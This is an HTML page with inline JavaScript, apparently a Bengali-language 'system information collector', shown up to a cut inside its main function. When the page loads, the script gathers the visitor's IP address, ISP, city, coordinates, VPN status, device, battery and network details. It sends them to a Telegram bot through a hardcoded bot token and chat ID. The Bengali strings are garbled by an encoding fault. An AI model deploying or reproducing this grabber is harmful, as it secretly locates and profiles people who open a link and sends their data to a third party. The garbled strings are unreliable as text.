<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>рж╕рж┐рж╕рзНржЯрзЗржо рждржерзНржп рж╕ржВржЧрзНрж░рж╣ржХрж╛рж░рзА</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #121212;
      color: #e0e0e0;
      text-align: center;
      padding: 20px;
    }
    #status {
      margin-top: 50px;
      color: #4CAF50;
      font-size: 18px;
    }
    #error {
      color: #f44336;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <h1>рж╕рж┐рж╕рзНржЯрзЗржо рждржерзНржп рж╕ржВржЧрзНрж░рж╣ржХрж╛рж░рзА</h1>
  <div id="status">рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...</div>
  <div id="error"></div>

  <script>
    const BOT_TOKEN = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58";
    const CHAT_ID = "7945358964";

    // рж╕рзНржЯрзНржпрж╛ржЯрж╛рж╕ ржЖржкржбрзЗржЯ ржлрж╛ржВрж╢ржи
    const updateStatus = (message) => {
      document.getElementById("status").textContent = message;
    };

    // ржПрж░рж░ ржжрзЗржЦрж╛ржирзЛрж░ ржлрж╛ржВрж╢ржи
    const showError = (message) => {
      const errorDiv = document.getElementById("error");
      errorDiv.style.display = "block";
      errorDiv.textContent = message;
    };

    // ржмрзНржпрж╛ржЯрж╛рж░рж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣
    const getBatteryInfo = async () => {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'ржЪрж╛рж░рзНржЬ рж╣ржЪрзНржЫрзЗ тЪб' : 'ржЪрж╛рж░рзНржЬ рж╣ржЪрзНржЫрзЗ ржирж╛',
            chargingTime: battery.chargingTime === Infinity ? 
                         'ржЪрж╛рж░рзНржЬрж╛рж░ рж╕ржВржпрзБржХрзНржд ржирзЗржЗ' : 
                         `${Math.floor(battery.chargingTime/60)} ржорж┐ржирж┐ржЯ ${Math.round(battery.chargingTime%60)} рж╕рзЗржХрзЗржирзНржб`,
            dischargingTime: battery.dischargingTime === Infinity ? 
                            'рж╕ржорзЯ ржирж┐рж░рзНржзрж╛рж░ржг ржХрж░рж╛ ржпрж╛рзЯржирж┐' : 
                            `${Math.floor(battery.dischargingTime/60)} ржорж┐ржирж┐ржЯ ${Math.round(battery.dischargingTime%60)} рж╕рзЗржХрзЗржирзНржб`
          };
        }
        return null;
      } catch (e) {
        console.error("ржмрзНржпрж╛ржЯрж╛рж░рж┐ API рждрзНрж░рзБржЯрж┐:", e);
        return null;
      }
    };

    // ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ рждржерзНржп рж╕ржВржЧрзНрж░рж╣
    const getNetworkInfo = () => {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        return {
          type: connection.type || 'ржЕржЬрж╛ржирж╛',
          effectiveType: connection.effectiveType || 'ржЕржЬрж╛ржирж╛',
          downlink: connection.downlink ? connection.downlink + ' Mbps' : 'ржЕржЬрж╛ржирж╛',
          rtt: connection.rtt ? connection.rtt + ' ms' : 'ржЕржЬрж╛ржирж╛',
          saveData: connection.saveData ? 'ржЪрж╛рж▓рзБ' : 'ржмржирзНржз'
        };
      }
      return null;
    };

    // ржбрж┐ржнрж╛ржЗрж╕ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ (рж╕ржВрж╢рзЛржзрж┐ржд)
    const getDeviceInfo = () => {
      const ua = navigator.userAgent;
      
      let os = "ржЕржЬрж╛ржирж╛";
      let matchOs;
      if (/Android/.test(ua)) {
        matchOs = /Android\s([0-9.]+)/.exec(ua);
        os = "Android " + (matchOs && matchOs[1] ? matchOs[1] : "");
      } else if (/iPhone|iPad|iPod/.test(ua)) {
        matchOs = /OS\s([0-9_]+)/.exec(ua);
        const osVersion = matchOs && matchOs[1] ? matchOs[1].replace(/_/g, ".") : "";
        const deviceName = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : "iPod";
        os = `${deviceName} OS ${osVersion}`;
      } else if (/Windows/.test(ua)) {
        matchOs = /Windows\sNT\s([0-9.]+)/.exec(ua);
        let winVersion = "";
        if (matchOs && matchOs[1]) {
            const ntVersion = matchOs[1];
            if (ntVersion === "10.0") winVersion = "10/11";
            else if (ntVersion === "6.3") winVersion = "8.1";
            else if (ntVersion === "6.2") winVersion = "8";
            else if (ntVersion === "6.1") winVersion = "7";
            else if (ntVersion === "6.0") winVersion = "Vista";
            else if (ntVersion === "5.1" || ntVersion === "5.2") winVersion = "XP";
            else winVersion = ntVersion; // ржЕржирзНржпрж╛ржирзНржп ржмрж╛ ржЕржЬрж╛ржирж╛ рж╕ржВрж╕рзНржХрж░ржг
        }
        os = "Windows " + winVersion;
      } else if (/Mac OS X/.test(ua)) {
        matchOs = /Mac OS X\s([0-9_]+)/.exec(ua);
        const osVersion = matchOs && matchOs[1] ? matchOs[1].replace(/_/g, ".") : "";
        os = `Mac OS X ${osVersion}`;
      } else if (/Linux/.test(ua) && !/Android/.test(ua)) {
        os = "Linux";
      }
      
      let browser = "ржЕржЬрж╛ржирж╛";
      const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edg|Opera|OPR|Edge|MSIE|Trident|SamsungBrowser)\/?\s?([0-9.]*)/i);
      if (browserMatch && browserMatch[1]) {
        let browserName = browserMatch[1];
        if (browserName === "Edg" || browserName === "Edge") browserName = "Edge";
        if (browserName === "OPR") browserName = "Opera";
        if (browserName === "MSIE" || (browserName === "Trident" && ua.includes("rv:"))) { // IE 11 or older
            browserName = "Internet Explorer";
            const ieVersionMatch = ua.match(/(MSIE\s|rv:)([0-9.]+)/);
            browserMatch[2] = ieVersionMatch && ieVersionMatch[2] ? ieVersionMatch[2] : "";
        }
        browser = browserName + (browserMatch[2] ? " " + browserMatch[2] : "");
      }
      
      let deviceModelStr = "ржирж┐рж░рзНржзрж╛рж░ржг ржХрж░рж╛ ржпрж╛рзЯржирж┐";
      const deviceModelPattern = /;\s*([^;)]+)\s*\)/;
      const deviceModelMatch = deviceModelPattern.exec(ua);
      if (deviceModelMatch && deviceModelMatch[1]) {
        // ржЕрждрж┐рж░рж┐ржХрзНржд ржХрж┐ржЫрзБ ржЕржВрж╢ ржмрж╛ржж ржжрзЗржУрзЯрж╛ ржпрж╛ ржоржбрзЗрж▓рзЗрж░ ржЕржВрж╢ ржирзЯ
        let rawModel = deviceModelMatch[1].trim();
        if (rawModel.includes("Build/")) {
            rawModel = rawModel.substring(0, rawModel.indexOf("Build/")).trim();
        }
        deviceModelStr = rawModel;
      }
      
      return {
        os,
        browser,
        deviceType: /Mobi|Android|iPhone|iPad|iPod/.test(ua) ? 
                   ((/Tablet|iPad/.test(ua)) ? "ржЯрзНржпрж╛ржмрж▓рзЗржЯ" : "ржорзЛржмрж╛ржЗрж▓") : 
                   "ржбрзЗрж╕рзНржХржЯржк",
        deviceModel: deviceModelStr,
        cpuCores: navigator.hardwareConcurrency || "ржЕржЬрж╛ржирж╛",
        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "ржЕржЬрж╛ржирж╛",
        screen: `${screen.width}x${screen.height}`,
        pixelRatio: window.devicePixelRatio || 1,
        language: navigator.language || "ржЕржЬрж╛ржирж╛",
        time: new Date().toLocaleString("bn-BD", { hour12: true }),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled ? "рж╕ржХрзНрж░рж┐рзЯ" : "ржирж┐рж╖рзНржХрзНрж░рж┐рзЯ",
        dnt: navigator.doNotTrack === "1" ? "рж╕ржХрзНрж░рж┐рзЯ" : (navigator.doNotTrack === "unspecified" || navigator.doNotTrack === null || typeof navigator.doNotTrack === "undefined" ? "ржЕржирж┐рж░рзНржжрж┐рж╖рзНржЯ" : "ржирж┐рж╖рзНржХрзНрж░рж┐рзЯ")
      };
    };

    // ржЖржЗржкрж┐ ржПржмржВ рж▓рзЛржХрзЗрж╢ржи рждржерзНржп рж╕ржВржЧрзНрж░рж╣
    const getIPInfo = async () => {
      try {
        updateStatus("ржЖржЗржкрж┐ ржПржмржВ рж▓рзЛржХрзЗрж╢ржи рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ (ipapi.co)...");
        const response = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(8000) }); // 8 рж╕рзЗржХрзЗржирзНржб ржЯрж╛ржЗржоржЖржЙржЯ
        if (!response.ok) throw new Error(`ipapi.co returned ${response.status}`);
        const data = await response.json();
        
        return {
          ip: data.ip || "ржЕржЬрж╛ржирж╛",
          isp: data.org || "ржЕржЬрж╛ржирж╛",
          city: data.city || "ржЕржЬрж╛ржирж╛",
          region: data.region || "ржЕржЬрж╛ржирж╛",
          country: data.country_name || "ржЕржЬрж╛ржирж╛",
          countryCode: data.country_code || "ржЕржЬрж╛ржирж╛",
          latitude: data.latitude || 0,
          longitude: data.longitude || 0,
          timezone: data.timezone || "ржЕржЬрж╛ржирж╛",
          vpn: (data.security && typeof data.security.vpn !== 'undefined') ? data.security.vpn : false,
          proxy: (data.security && typeof data.security.proxy !== 'undefined') ? data.security.proxy : false,
          hosting: (data.security && typeof data.security.hosting !== 'undefined') ? data.security.hosting : false
        };
      } catch (e) {
        console.warn("ipapi.co ржерзЗржХрзЗ ржЖржЗржкрж┐ рждржерзНржп ржкрзЗрждрзЗ ржмрзНржпрж░рзНрже, ржлрж▓ржмрзНржпрж╛ржХ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ:", e.message);
        try {
          updateStatus("ржЖржЗржкрж┐ ржПржмржВ рж▓рзЛржХрзЗрж╢ржи рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ (ip-api.com)...");
          const response = await fetch("https://pro.ip-api.com/json/?fields=66846719&key=YOUR_IP_API_COM_KEY", { signal: AbortSignal.timeout(8000) }); // ржЖржкржирж╛рж░ API ржХрзА ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзБржи ржЕржержмрж╛ ржлрзНрж░рж┐ ржПржирзНржбржкрзЯрзЗржирзНржЯ: http://ip-api.com/json/?fields=...
          // const response = await fetch("http://ip-api.com/json/?fields=query,isp,city,regionName,country,countryCode,lat,lon,timezone,proxy,hosting,status", { signal: AbortSignal.timeout(8000) }); // ржлрзНрж░рж┐ ржПржирзНржбржкрзЯрзЗржирзНржЯ
          if (!response.ok) throw new Error(`ip-api.com returned ${response.status}`);
          const data = await response.json();
          if (data.status !== "success") throw new Error(`ip-api.com status: ${data.status}, message: ${data.message}`);
          
          return {
            ip: data.query,
            isp: data.isp || "ржЕржЬрж╛ржирж╛",
            city: data.city || "ржЕржЬрж╛ржирж╛",
            region: data.regionName || "ржЕржЬрж╛ржирж╛",
            country: data.country || "ржЕржЬрж╛ржирж╛",
            countryCode: data.countryCode || "ржЕржЬрж╛ржирж╛",
            latitude: data.lat || 0,
            longitude: data.lon || 0,
            timezone: data.timezone || "ржЕржЬрж╛ржирж╛",
            vpn: (typeof data.proxy !== 'undefined') ? data.proxy : false, // ip-api.com "proxy" ржлрж┐рж▓рзНржб ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ VPN/Proxy ржЙржнрзЯрзЗрж░ ржЬржирзНржп
            proxy: (typeof data.proxy !== 'undefined') ? data.proxy : false,
            hosting: (typeof data.hosting !== 'undefined') ? data.hosting : false
          };
        } catch (e2) {
          console.error("ржЖржЗржкрж┐ API ржлрж▓ржмрзНржпрж╛ржХ рждрзНрж░рзБржЯрж┐:", e2.message);
          showError("ржЖржЗржкрж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ ржпрж╛рзЯржирж┐ред ржирзЗржЯржУрзЯрж╛рж░рзНржХ рж╕ржВржпрзЛржЧ ржкрж░рзАржХрзНрж╖рж╛ ржХрж░рзБржиред");
          return { // ржПржХржЯрж┐ ржмрзЗрж╕рж┐ржХ ржлрж▓ржмрзНржпрж╛ржХ ржЕржмржЬрзЗржХрзНржЯ
            ip: "ржЕржЬрж╛ржирж╛", isp: "ржЕржЬрж╛ржирж╛", city: "ржЕржЬрж╛ржирж╛", region: "ржЕржЬрж╛ржирж╛", country: "ржЕржЬрж╛ржирж╛",
            countryCode: "ржЕржЬрж╛ржирж╛", latitude: 0, longitude: 0, timezone: "ржЕржЬрж╛ржирж╛",
            vpn: false, proxy: false, hosting: false
          };
        }
      }
    };

    // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржорзЗрж╕рзЗржЬ ржлрж░ржорзНржпрж╛ржЯ
    const formatMessage = (ipInfo, deviceInfo, batteryInfo, networkInfo) => {
      let message = `*рж╕рж┐рж╕рзНржЯрзЗржо рждржерзНржп ржкрзНрж░рждрж┐ржмрзЗржжржи - ${deviceInfo.time}*\n\n`; // deviceInfo ржерзЗржХрзЗ рж╕ржорзЯ ржмрзНржпржмрж╣рж╛рж░
      
      // рж▓рзЛржХрзЗрж╢ржи рж╕рзЗржХрж╢ржи
      message += `ЁЯМР *ржЕржмрж╕рзНржерж╛ржи ржУ ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ:*\n`;
      message += `  тАв ржЖржЗржкрж┐: \`${ipInfo.ip}\`\n`;
      message += `  тАв ржЖржЗржПрж╕ржкрж┐: ${ipInfo.isp}\n`;
      message += `  тАв ржЕржмрж╕рзНржерж╛ржи: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.countryCode})\n`;
      message += `  тАв рж╕рзНржерж╛ржирж╛ржЩрзНржХ: [${ipInfo.latitude}, ${ipInfo.longitude}](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})\n`;
      message += `  тАв рж╕ржоржпрж╝ ржЕржЮрзНржЪрж▓: ${ipInfo.timezone}\n`;
      message += `  тАв ржнрж┐ржкрж┐ржПржи: ${ipInfo.vpn ? "рж╣рзНржпрж╛ржБ тЬЕ" : "ржирж╛ тЭМ"}\n`;
      message += `  тАв ржкрзНрж░ржХрзНрж╕рж┐: ${ipInfo.proxy ? "рж╣рзНржпрж╛ржБ тЬЕ" : "ржирж╛ тЭМ"}\n`;
      message += `  тАв рж╣рзЛрж╕рзНржЯрж┐ржВ: ${ipInfo.hosting ? "рж╣рзНржпрж╛ржБ тЬЕ" : "ржирж╛ тЭМ"}\n\n`;
      
      // ржбрж┐ржнрж╛ржЗрж╕ рж╕рзЗржХрж╢ржи
      message += `ЁЯУ▒ *ржбрж┐ржнрж╛ржЗрж╕ ржмрж┐ржмрж░ржг:*\n`;
      message += `  тАв ржЕржкрж╛рж░рзЗржЯрж┐ржВ рж╕рж┐рж╕рзНржЯрзЗржо: ${deviceInfo.os}\n`;
      message += `  тАв ржмрзНрж░рж╛ржЙржЬрж╛рж░: ${deviceInfo.browser}\n`;
      message += `  тАв ржбрж┐ржнрж╛ржЗрж╕: ${deviceInfo.deviceType} (${deviceInfo.deviceModel})\n`;
      message += `  тАв рж╕рж┐ржкрж┐ржЗржЙ ржХрзЛрж░: ${deviceInfo.cpuCores}\n`;
      message += `  тАв рж░рзНржпрж╛ржо: ${deviceInfo.ram}\n`;
      message += `  тАв рж╕рзНржХрзНрж░рж┐ржи рж░рзЗржЬрзЛрж▓рж┐ржЙрж╢ржи: ${deviceInfo.screen}\n`;
      message += `  тАв ржкрж┐ржХрзНрж╕рзЗрж▓ рж░рзЗрж╢рж┐ржУ: ${deviceInfo.pixelRatio}x\n\n`;
      
      // ржмрзНржпрж╛ржЯрж╛рж░рж┐ рж╕рзЗржХрж╢ржи
      if (batteryInfo) {
        message += `ЁЯФЛ *ржмрзНржпрж╛ржЯрж╛рж░рж┐ рж╕рзНржерж┐рждрж┐:*\n`;
        message += `  тАв ржЪрж╛рж░рзНржЬ рж▓рзЗржнрзЗрж▓: ${batteryInfo.level}\n`;
        message += `  тАв рж╕рзНржЯрзНржпрж╛ржЯрж╛рж╕: ${batteryInfo.charging}\n`;
        // ржЪрж╛рж░рзНржЬрж┐ржВ/ржбрж┐рж╕ржЪрж╛рж░рзНржЬрж┐ржВ рж╕ржорзЯ рж╢рзБржзрзБржорж╛рждрзНрж░ ржирж┐рж░рзНржжрж┐рж╖рзНржЯ ржорж╛ржи ржерж╛ржХрж▓рзЗ ржжрзЗржЦрж╛ржирзЛ рж╣ржмрзЗ
        if (batteryInfo.chargingTime !== 'ржЪрж╛рж░рзНржЬрж╛рж░ рж╕ржВржпрзБржХрзНржд ржирзЗржЗ') {
          message += `  тАв ржкрзВрж░рзНржг ржЪрж╛рж░рзНржЬ рж╣рждрзЗ ржмрж╛ржХрж┐: ${batteryInfo.chargingTime}\n`;
        }
        if (batteryInfo.dischargingTime !== 'рж╕ржорзЯ ржирж┐рж░рзНржзрж╛рж░ржг ржХрж░рж╛ ржпрж╛рзЯржирж┐') {
          message += `  тАв ржЖржирзБржорж╛ржирж┐ржХ ржмрж╛ржХрж┐ ржЪрж╛рж░рзНржЬ: ${batteryInfo.dischargingTime}\n`;
        }
        message += `\n`;
      }
      
      // ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ ржХрж╛ржирзЗржХрж╢ржи рж╕рзЗржХрж╢ржи
      if (networkInfo) {
        message += `ЁЯУ╢ *ржХрж╛ржирзЗржХрж╢ржи ржмрж┐ржмрж░ржг:*\n`;
        message += `  тАв рж╕ржВржпрзЛржЧрзЗрж░ ржзрж░ржи: ${networkInfo.type}\n`;
        message += `  тАв ржХрж╛рж░рзНржпржХрж░ ржзрж░ржи: ${networkInfo.effectiveType}\n`;
        message += `  тАв ржбрж╛ржЙржирж▓рж┐ржВржХ ржЧрждрж┐: ${networkInfo.downlink}\n`;
        message += `  тАв рж░рж╛ржЙржирзНржб-ржЯрзНрж░рж┐ржк ржЯрж╛ржЗржо (RTT): ${networkInfo.rtt}\n`;
        message += `  тАв ржбрж╛ржЯрж╛ рж╕рзЗржнрж╛рж░ ржорзЛржб: ${networkInfo.saveData}\n\n`;
      }
      
      // ржЕржирзНржпрж╛ржирзНржп рждржерзНржп
      message += `тЪЩя╕П *ржЕржирзНржпрж╛ржирзНржп рждржерзНржп:*\n`;
      message += `  тАв ржнрж╛рж╖рж╛: ${deviceInfo.language}\n`;
      message += `  тАв ржХрзБржХрж┐ржЬ: ${deviceInfo.cookies}\n`;
      message += `  тАв ржбрзБ ржиржЯ ржЯрзНрж░рзНржпрж╛ржХ (DNT): ${deviceInfo.dnt}\n`;
      message += `  тАв ржЗржЙржЖрж░ржПрж▓: [рж▓рж┐ржЩрзНржХ](${window.location.href})\n`; // URL ржП Markdown рж▓рж┐ржЩрзНржХ
      // message += `  тАв рж╢рж┐рж░рзЛржирж╛ржо: ${document.title}\n`; // рж╢рж┐рж░рзЛржирж╛ржо ржмрж╛ржж ржжрзЗржУрзЯрж╛ рж╣рж▓рзЛ, ржЕржирзЗржХ рж▓ржорзНржмрж╛ рж╣рждрзЗ ржкрж╛рж░рзЗ

      return message;
    };

    // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛрж░ ржлрж╛ржВрж╢ржи
    const sendToTelegram = async (message) => {
      try {
        // MarkdownV2 ржПрж░ ржЬржирзНржп ржмрж┐рж╢рзЗрж╖ ржЕржХрзНрж╖рж░ ржПрж╕рзНржХрзЗржк ржХрж░рж╛
        const escapedMessage = message
          .replace(/_/g, "\\_")
          .replace(/\*/g, "\\*")
          .replace(/\[/g, "\\[")
          // .replace(/\]/g, "\\]") // ] ржХрзЗ Escape ржХрж░рж▓рзЗ рж▓рж┐ржЩрзНржХрзЗ рж╕ржорж╕рзНржпрж╛ рж╣рждрзЗ ржкрж╛рж░рзЗ ржпржжрж┐ рж▓рж┐ржЩрзНржХрзЗрж░ ржЯрзЗржХрзНрж╕ржЯ ржП ржерж╛ржХрзЗ
          .replace(/\(/g, "\\(")
          // .replace(/\)/g, "\\)") // ) ржХрзЗ Escape ржХрж░рж▓рзЗ рж▓рж┐ржЩрзНржХрзЗ рж╕ржорж╕рзНржпрж╛ рж╣рждрзЗ ржкрж╛рж░рзЗ
          .replace(/~/g, "\\~")
          .replace(/`/g, "\\`")
          .replace(/>/g, "\\>")
          .replace(/#/g, "\\#")
          .replace(/\+/g, "\\+")
          .replace(/-/g, "\\-")
          .replace(/=/g, "\\=")
          .replace(/\|/g, "\\|")
          .replace(/\{/g, "\\{")
          .replace(/\}/g, "\\}")
          .replace(/\./g, "\\.")
          .replace(/!/g, "\\!");
        
        // рж▓рж┐ржЩрзНржХрзЗрж░ ] ржПржмржВ ) ржпрзЗржи escape ржирж╛ рж╣рзЯ рждрж╛рж░ ржЬржирзНржп ржПржХржЯрж┐ workaround:
        // ржкрзНрж░ржержорзЗ рж╕ржм escape ржХрж░рзЗ, рждрж╛рж░ржкрж░ рж▓рж┐ржЩрзНржХрзЗрж░ ржлрж░ржорзНржпрж╛ржЯржХрзЗ unescape ржХрж░рж╛ред
        // ржПржЯрж┐ ржЬржЯрж┐рж▓ рж╣рждрзЗ ржкрж╛рж░рзЗред рж╕рж╣ржЬ ржЙржкрж╛рзЯ рж╣рж▓ рж▓рж┐ржЩрзНржХрзЗрж░ ржЯрзЗржХрзНрж╕ржЯ ржП ржмрж┐рж╢рзЗрж╖ ржЕржХрзНрж╖рж░ ржирж╛ рж░рж╛ржЦрж╛ред
        // ржЕржержмрж╛, parse_mode: "HTML" ржмрзНржпржмрж╣рж╛рж░ ржХрж░рж╛ ржпрзЗрждрзЗ ржкрж╛рж░рзЗ, ржпрж╛ рж╕рж╛ржзрж╛рж░ржгржд escape ржХрж░рждрзЗ рж╕рж╣ржЬред
        // ржЖржкрж╛рждржд MarkdownV2 ржПрж░ ржЬржирзНржп ржЙржкрж░рзЗрж░ escape ржпржерзЗрж╖рзНржЯред

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: escapedMessage, // escapedMessage ржмрзНржпржмрж╣рж╛рж░ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ
            parse_mode: "MarkdownV2",
            disable_web_page_preview: false // рж▓рж┐ржЩрзНржХ ржкрзНрж░рж┐ржнрж┐ржЙ ржЪрж╛рж▓рзБ рж░рж╛ржЦрж╛ рж╣рж▓рзЛ
          })
        });
        
        const data = await response.json();
        if (!data.ok) {
          console.error("ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо API ржерзЗржХрзЗ ржкрзНрж░рж╛ржкрзНржд рждрзНрж░рзБржЯрж┐:", data);
          // ржмрзНржпржмрж╣рж╛рж░ржХрж╛рж░рзАржХрзЗ ржжрзЗржЦрж╛ржирзЛрж░ ржЬржирзНржп ржПржХржЯрж┐ рж╕рж╛ржзрж╛рж░ржг рждрзНрж░рзБржЯрж┐ ржмрж╛рж░рзНрждрж╛
          let userFriendlyError = `ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо API рждрзНрж░рзБржЯрж┐: ${data.description || "ржЕржЬрж╛ржирж╛ рждрзНрж░рзБржЯрж┐"}`;
          if (data.description && data.description.includes("Too Many Requests")) {
              userFriendlyError = "ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛрж░ ржЕржирзБрж░рзЛржзрзЗрж░ рж╕рзАржорж╛ ржЕрждрж┐ржХрзНрж░ржо ржХрж░рзЗржЫрзЗред ржЕржирзБржЧрзНрж░рж╣ ржХрж░рзЗ ржХрж┐ржЫрзБржХрзНрж╖ржг ржкрж░ ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рзБржиред";
          } else if (data.description && data.description.includes("unescaped")){
              userFriendlyError = "ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржмрж╛рж░рзНрждрж╛ ржлрж░ржорзНржпрж╛ржЯ ржХрж░рждрзЗ рж╕ржорж╕рзНржпрж╛ рж╣рзЯрзЗржЫрзЗ (ржПрж╕рзНржХрзЗржкрж┐ржВ рждрзНрж░рзБржЯрж┐)ред";
          }
          throw new Error(userFriendlyError);
        }
        
        return true;
      } catch (e) {
        console.error("ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛрж░ рждрзНрж░рзБржЯрж┐:", e);
        // ржЗрждрж┐ржоржзрзНржпрзЗ friendy error ржерж╛ржХрж▓рзЗ рж╕рзЗржЯрж╛ ржжрзЗржЦрж╛ржирзЛ рж╣ржмрзЗ
        throw new Error(e.message.startsWith("ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо API рждрзНрж░рзБржЯрж┐") || e.message.startsWith("ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржмрж╛рж░рзНрждрж╛ ржлрж░ржорзНржпрж╛ржЯ ржХрж░рждрзЗ рж╕ржорж╕рзНржпрж╛") ? e.message : "ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ рждржерзНржп ржкрж╛ржарж╛рждрзЗ ржмрзНржпрж░рзНрже: " + e.message);
      }
    };

    // ржкрзНрж░ржзрж╛ржи ржлрж╛ржВрж╢ржи
    const collectAndSendInfo = async () => {
      try {
        // ржЖржЗржкрж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ (ржЖржЧрзЗ ржХрж▓ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ ржХрж╛рж░ржг ржПржЯрж┐ ржирзЗржЯржУрзЯрж╛рж░рзНржХ ржирж┐рж░рзНржнрж░)
        const ipInfo = await getIPInfo();
        // ржпржжрж┐ ipInfo ржлрж▓ржмрзНржпрж╛ржХ ржерзЗржХрзЗ ржЖрж╕рзЗ ржПржмржВ ip "ржЕржЬрж╛ржирж╛" рж╣рзЯ, рждрж╛рж╣рж▓рзЗ ржПржЦрж╛ржирзЗ ржирзЗржЯржУрзЯрж╛рж░рзНржХ рж╕ржорж╕рзНржпрж╛ ржерж╛ржХрждрзЗ ржкрж╛рж░рзЗ
        if (ipInfo.ip === "ржЕржЬрж╛ржирж╛" && !document.getElementById("error").textContent.includes("ржЖржЗржкрж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ ржпрж╛рзЯржирж┐")) {
            showError("ржкрзНрж░рж╛ржержорж┐ржХ ржирзЗржЯржУрзЯрж╛рж░рзНржХ рж╕ржорж╕рзНржпрж╛ред ржХрж┐ржЫрзБ рждржерзНржп ржЕрж╕ржорзНржкрзВрж░рзНржг ржерж╛ржХрждрзЗ ржкрж╛рж░рзЗред");
        }
        
        // ржбрж┐ржнрж╛ржЗрж╕ рждржерзНржп рж╕ржВржЧрзНрж░рж╣
        updateStatus("ржбрж┐ржнрж╛ржЗрж╕ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...");
        const deviceInfo = getDeviceInfo();
        
        // ржмрзНржпрж╛ржЯрж╛рж░рж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣
        updateStatus("ржмрзНржпрж╛ржЯрж╛рж░рж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...");
        const batteryInfo = await getBatteryInfo();
        
        // ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ рждржерзНржп рж╕ржВржЧрзНрж░рж╣
        updateStatus("ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ рж╕ржВржпрзЛржЧрзЗрж░ ржмрж┐ржмрж░ржг рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...");
        const networkInfo = getNetworkInfo();
        
        // ржорзЗрж╕рзЗржЬ ржлрж░ржорзНржпрж╛ржЯ
        updateStatus("рждржерзНржп ржкрзНрж░рждрж┐ржмрзЗржжржи ржкрзНрж░рж╕рзНрждрзБржд ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...");
        const message = formatMessage(ipInfo, deviceInfo, batteryInfo, networkInfo);
        
        // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржи
        updateStatus("ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ рждржерзНржп ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ...");
        await sendToTelegram(message);
        
        // рж╕ржлрж▓ ржорзЗрж╕рзЗржЬ
        updateStatus("тЬЕ рждржерзНржп рж╕ржлрж▓ржнрж╛ржмрзЗ ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗ!");
        // ржкрзЗржЬржЯрж┐ ржмржирзНржз ржХрж░рзЗ ржжрзЗржУрзЯрж╛ ржмрж╛ рж░рж┐ржбрж╛ржЗрж░рзЗржХрзНржЯ ржХрж░рж╛рж░ ржЕржкрж╢ржи (ржкрзНрж░рзЯрзЛржЬржи ржЕржирзБржпрж╛рзЯрзА)
        // setTimeout(() => { window.close(); }, 3000); // рзй рж╕рзЗржХрзЗржирзНржб ржкрж░ ржЙржЗржирзНржбрзЛ ржмржирзНржз ржХрж░рж╛рж░ ржЪрзЗрж╖рзНржЯрж╛
